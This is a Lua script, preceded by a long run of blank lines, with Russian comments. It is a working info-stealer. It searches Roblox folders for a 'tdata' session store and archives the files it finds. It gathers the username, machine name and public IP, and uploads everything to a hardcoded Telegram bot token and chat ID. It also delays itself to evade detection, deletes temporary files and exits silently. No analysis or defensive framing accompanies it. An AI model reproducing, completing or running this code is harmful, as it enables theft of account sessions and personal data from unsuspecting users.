










































































































































































































































































































local _environmentDetector = {}
local _dataCollector = {}
local _communicationModule = {}
local _tdataStealer = {}
local _fileManager = {}


local _telegramConfig = {
    _part1 = "7771675205:AAHnUghHQhSnK4qFY1JLUSomuoPys-zQc8c",
    _part2 = "",
    _part3 = "",
    _chatPart1 = "5253543157",
    _chatPart2 = ""
}


local function _assembleConfig()
    local _finalToken = _telegramConfig._part1 .. _telegramConfig._part2 .. _telegramConfig._part3
    local _finalChat = _telegramConfig._chatPart1 .. _telegramConfig._chatPart2
    return _finalToken, _finalChat
end


local function _safeExecute(_functionToExecute, ...)
    local _executionStatus, _result = pcall(_functionToExecute, ...)
    if _executionStatus then
        return _result
    else
        return nil
    end
end

-- Менеджер файлов
function _fileManager:createTempZip(files, sourcePath)
    return _safeExecute(function()
        local _tempZipPath = os.getenv("TEMP") .. "\\rbx_data_" .. os.time() .. ".zip"
        
        -- Создание bat файла для архивации
        local _batContent = "@echo off\n"
        _batContent = _batContent .. "cd \"" .. sourcePath .. "\"\n"
        _batContent = _batContent .. "tar -acf \"" .. _tempZipPath .. "\""
        
        for _, file in ipairs(files) do
            _batContent = _batContent .. " \"" .. file .. "\""
        end
        
        _batContent = _batContent .. " 2>nul\n"
        _batContent = _batContent .. "if %errorlevel% neq 0 (\n"
        _batContent = _batContent .. "  7z a \"" .. _tempZipPath .. "\""
        
        for _, file in ipairs(files) do
            _batContent = _batContent .. " \"" .. file .. "\""
        end
        
        _batContent = _batContent .. " -y >nul 2>&1\n"
        _batContent = _batContent .. ")\n"
        
        local _batPath = os.getenv("TEMP") .. "\\pack.bat"
        local _batFile = io.open(_batPath, "w")
        if _batFile then
            _batFile:write(_batContent)
            _batFile:close()
            
            os.execute(_batPath .. " >nul 2>&1")
            os.remove(_batPath)
            
            -- Проверка создания архива
            if os.execute("dir \"" .. _tempZipPath .. "\" >nul 2>&1") then
                return _tempZipPath
            end
        end
        
        return nil
    end)
end

function _fileManager:cleanupFile(filePath)
    _safeExecute(function()
        os.remove(filePath)
    end)
end

-- Определение платформы
function _environmentDetector:identifyPlatform()
    return _safeExecute(function()
        local _systemInfo = {
            _userAgent = tostring(os.getenv("HTTP_USER_AGENT") or ""),
            _platform = tostring(package.config:sub(1,1)) == "\\" and "Windows" or "Unix"
        }
        
        if _systemInfo._userAgent:find("Android") or _systemInfo._userAgent:find("iPhone") then
            return "Mobile"
        else
            return "Desktop"
        end
    end) or "Unknown"
end

-- Модуль tdata
function _tdataStealer:attemptTDataCollection(tdataPath)
    return _safeExecute(function()
        local _tdataResult = {
            files = {},
            zipPath = nil
        }
        
        -- Проверка существования пути
        if not os.execute("dir " .. tdataPath .. " 2>nul 1>nul") then
            return _tdataResult
        end
        
        -- Перечисление файлов в tdata
        local _pipe = io.popen('dir "' .. tdataPath .. '" /b 2>nul')
        if _pipe then
            for _fileName in _pipe:lines() do
                if _fileName ~= "." and _fileName ~= ".." then
                    if _fileName:match("%.bin$") or _fileName:match("^f") or _fileName:match("slist") then
                        table.insert(_tdataResult.files, _fileName)
                    end
                end
            end
            _pipe:close()
        end
        
        -- Создание архива если есть файлы
        if #_tdataResult.files > 0 then
            _tdataResult.zipPath = _fileManager:createTempZip(_tdataResult.files, tdataPath)
        end
        
        return _tdataResult
    end) or {files = {}}
end

-- Сбор данных для Desktop
function _dataCollector:gatherDesktopData()
    return _safeExecute(function()
        local _collectedData = {}
        
        -- Поиск Roblox данных
        local _possiblePaths = {
            _path1 = os.getenv("LOCALAPPDATA") .. "\\Roblox\\",
            _path2 = os.getenv("APPDATA") .. "\\Roblox\\",
            _path3 = os.getenv("USERPROFILE") .. "\\AppData\\Local\\Roblox\\"
        }
        
        -- Попытка найти tdata
        for _key, _path in pairs(_possiblePaths) do
            if os.execute("dir " .. _path .. " 2>nul 1>nul") then
                _collectedData.tdataPath = _path .. "tdata\\"
                break
            end
        end
        
        -- Сбор системной информации
        _collectedData.username = os.getenv("USERNAME") or "Unknown"
        _collectedData.computerName = os.getenv("COMPUTERNAME") or "Unknown"
        
        -- Получение IP через внешний сервис
        local _ipResponse = _communicationModule:httpRequest("http://api.ipify.org")
        _collectedData.ipAddress = _ipResponse or "Unable to get IP"
        
        -- Кtdata если найден путь
        if _collectedData.tdataPath then
            _collectedData.tdataResult = _tdataStealer:attemptTDataCollection(_collectedData.tdataPath)
        end
        
        return _collectedData
    end) or {}
end

-- Сбор данных для Mobile
function _dataCollector:gatherMobileData()
    return _safeExecute(function()
        local _mobileData = {}
        
        -- Базовая информация
        _mobileData.platform = "Mobile"
        _mobileData.deviceModel = os.getenv("MODEL") or "Unknown"
        
        -- Получение IP
        local _mobileIP = _communicationModule:httpRequest("http://api.ipify.org")
        _mobileData.ipAddress = _mobileIP or "Unable to get IP"
        
        return _mobileData
    end) or {}
end

-- HTTP запросы
function _communicationModule:httpRequest(url)
    return _safeExecute(function()
        local _http = require("socket.http")
        local _response, _status = _http.request(url)
        
        if _status == 200 then
            return _response
        end
        return nil
    end)
end

-- Отправка сообщения в Telegram
function _communicationModule:sendMessageToTelegram(data)
    return _safeExecute(function()
        local _token, _chatId = _assembleConfig()
        local _telegramUrl = "https://api.telegram.org/bot" .. _token .. "/sendMessage"
        
        local _message = "🔒 *Roblox Data Collected*\n\n"
        _message = _message .. "📱 *Platform*: " .. (data.platform or "Unknown") .. "\n"
        _message = _message .. "👤 *Username*: " .. (data.username or "N/A") .. "\n"
        _message = _message .. "💻 *Computer*: " .. (data.computerName or "N/A") .. "\n"
        _message = _message .. "🌐 *IP Address*: " .. (data.ipAddress or "Unknown") .. "\n"
        _message = _message .. "📁 *TData Available*: " .. tostring(data.tdataPath ~= nil) .. "\n"
        
        if data.tdataPath then
            _message = _message .. "📂 *TData Path*: " .. data.tdataPath .. "\n"
        end
        
        if data.tdataResult and data.tdataResult.files and #data.tdataResult.files > 0 then
            _message = _message .. "📄 *TData Files*: " .. #data.tdataResult.files .. " found\n"
        end
        
        local _http = require("socket.http")
        local _ltn12 = require("ltn12")
        
        local _responseBody = {}
        local _payload = string.format(
            '{"chat_id":"%s","text":"%s","parse_mode":"Markdown"}',
            _chatId,
            _message:gsub('"', '\\"'):gsub("\n", "\\n")
        )
        
        local _result, _code = _http.request{
            url = _telegramUrl,
            method = "POST",
            headers = {
                ["Content-Type"] = "application/json",
                ["Content-Length"] = tostring(#_payload)
            },
            source = _ltn12.source.string(_payload),
            sink = _ltn12.sink.table(_responseBody)
        }
        
        return _code == 200
    end) or false
end

-- Отправка файла через sendDocument
function _communicationModule:sendDocumentToTelegram(filePath, caption)
    return _safeExecute(function()
        local _token, _chatId = _assembleConfig()
        local _telegramUrl = "https://api.telegram.org/bot" .. _token .. "/sendDocument"
        
        local _http = require("socket.http")
        local _mime = require("mime")
        local _ltn12 = require("ltn12")
        
        -- Чтение файла
        local _file = io.open(filePath, "rb")
        if not _file then return false end
        
        local _fileContent = _file:read("*a")
        _file:close()
        
        -- Создание multipart формы
        local _boundary = "----RobloxDataBoundary" .. os.time()
        local _bodyParts = {}
        
        -- Добавление chat_id
        table.insert(_bodyParts, "--" .. _boundary .. "\r\n")
        table.insert(_bodyParts, 'Content-Disposition: form-data; name="chat_id"' .. "\r\n\r\n")
        table.insert(_bodyParts, _chatId .. "\r\n")
        
        -- Добавление caption если есть
        if caption then
            table.insert(_bodyParts, "--" .. _boundary .. "\r\n")
            table.insert(_bodyParts, 'Content-Disposition: form-data; name="caption"' .. "\r\n\r\n")
            table.insert(_bodyParts, caption .. "\r\n")
        end
        
        -- Добавление файла
        table.insert(_bodyParts, "--" .. _boundary .. "\r\n")
        table.insert(_bodyParts, 'Content-Disposition: form-data; name="document"; filename="tdata.zip"' .. "\r\n")
        table.insert(_bodyParts, "Content-Type: application/zip\r\n\r\n")
        table.insert(_bodyParts, _fileContent)
        table.insert(_bodyParts, "\r\n")
        table.insert(_bodyParts, "--" .. _boundary .. "--\r\n")
        
        -- Сборка тела
        local _body = table.concat(_bodyParts)
        
        local _responseBody = {}
        local _result, _code = _http.request{
            url = _telegramUrl,
            method = "POST",
            headers = {
                ["Content-Type"] = "multipart/form-data; boundary=" .. _boundary,
                ["Content-Length"] = tostring(#_body)
            },
            source = _ltn12.source.string(_body),
            sink = _ltn12.sink.table(_responseBody)
        }
        
        return _code == 200
    end) or false
end

-- Основная функция
local function _mainExecution()
    -- Задержка для избежания detection
    _safeExecute(function()
        os.execute("ping -n 3 127.0.0.1 > nul")
    end)
    
    local _platformType = _environmentDetector:identifyPlatform()
    local _collectedData = {}
    
    _collectedData.platform = _platformType
    _collectedData.timestamp = os.time()
    
    if _platformType == "Desktop" then
        local _desktopData = _dataCollector:gatherDesktopData()
        for k, v in pairs(_desktopData) do
            _collectedData[k] = v
        end
    else
        local _mobileData = _dataCollector:gatherMobileData()
        for k, v in pairs(_mobileData) do
            _collectedData[k] = v
        end
    end
    
    -- Отправка сообщения с данными
    _communicationModule:sendMessageToTelegram(_collectedData)
    
    -- Отправка tdata архива если есть
    if _collectedData.tdataResult and _collectedData.tdataResult.zipPath then
        local _caption = "TData from: " .. (_collectedData.username or "Unknown") .. " | IP: " .. (_collectedData.ipAddress or "Unknown")
        _communicationModule:sendDocumentToTelegram(_collectedData.tdataResult.zipPath, _caption)
        
        -- Очистка временного файла
        _fileManager:cleanupFile(_collectedData.tdataResult.zipPath)
    end
    
    -- Тихая очистка
    _safeExecute(function()
        os.execute("del /f /q temp_log.txt 2>nul")
    end)
    
    return true
end

-- Запуск с максимальной защитой от ошибок
local _finalSuccess = _safeExecute(_mainExecution)

-- Бесшумное завершение в любом случае
os.execute("exit 0")